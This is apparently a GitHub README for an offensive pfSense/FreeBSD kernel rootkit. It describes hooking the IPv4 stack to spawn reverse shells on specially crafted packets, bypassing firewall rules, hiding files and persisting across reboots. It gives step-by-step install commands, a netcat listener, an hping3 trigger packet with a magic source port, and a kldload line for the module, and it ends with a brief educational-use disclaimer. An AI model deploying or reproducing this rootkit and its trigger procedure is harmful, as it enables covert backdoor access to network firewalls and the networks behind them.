# House of Sharad - pfSense Rootkit

## 🚀 Overview

House of Sharad is a pfSense rootkit that hooks into the IPv4 stack of the FreeBSD kernel, allowing for stealthy reverse shells by detecting specially crafted packets.

## 🔥 Huge Thanks

First and foremost, a massive thank you to my friend Sharad (mineo333) for helping implement the core functionality of forking a process and executing kern_execve() in the child. This is what enables command execution when a packet with a specific source port is detected. This rootkit wouldn't be possible without his help.

Additionally, the file-hiding functionality is directly borrowed from BlueDragonSecurity's (bluedragonsecurity) bsd_freebsd project. Huge thanks for this work!

## 📌 Compatibility

The precompiled .ko files are mainly compatable with pfSense 2.7.2 CE but have also worked for pfSense 2.7.1 CE.

If you need to compile them yourself, you must do so within a pfSense environment (not just a compatible FreeBSD kernel).

Follow the setup guide: extra/how_to_setup_pfsense_to_compile.txt.

## 🛠️ Features

✅ Hooks into pfSense’s IPv4 stack for stealthy reverse shell execution

✅ Bypasses firewall rules (even if attacker IP/port is blocked) while showing malicous incoming packets as dropped

✅ Persistance accorss reboots and unloading

✅ File hiding functionality

✅ Uses socat for reliable reverse shells (pfSense’s nc lacks reverse shell support)

## 🏗️ Installation

### 1️⃣ Cloning and Setup

### Clone the repository
git clone https://github.com/Mon-keyBoy/house_of_sharad.git
```cd house_of_sharad```

### Set execution permissions
```chmod +x load_and_setup.sh```

### Run the setup script
```./load_and_setup.sh```

Once the script completes, you'll be inside a ghost /house_of_sharad directory. To return to root, run:

```cd /```

## 🛡️ Getting a Reverse Shell

### 1️⃣ Start a Listener

On your attacking machine, open a terminal and start a listener:

```nc -lvnp 7000```

### 2️⃣ Trigger the Reverse Shell

In another terminal, send packets that will activate the rootkit:

```sudo hping3 -S -p 80 -s 6969 <TARGET_IP>```

🔹 Port 80 is a good choice for the destination port.
🔹 If the shell doesn’t connect after ~5 packets, press Ctrl + C and re-run the command (packet filtering can be finicky).

## 🧩 Additional Notes

Persistence: This rootkit is loaded via apeshit.sh upon boot, which is setup by load_and_setup.sh.

Extra Fun: The extra/ directory contains a simple LKM that prints a face endlessly to the terminal (input still works, but it scrolls rapidly). To stop it, simply unload the module, this is also finickey and the texct might just appear in kernel logs instead (this happened in pfSense 2.7.1 CE but it worked as intended in pfSense 2.7.2 CE).

### Loading It

```kldload /boot/modules/.evil/evil.ko```

# ⚠️ Disclaimer: This project is for educational and research purposes only. Unauthorized use may be illegal. The author takes no responsibility for misuse.

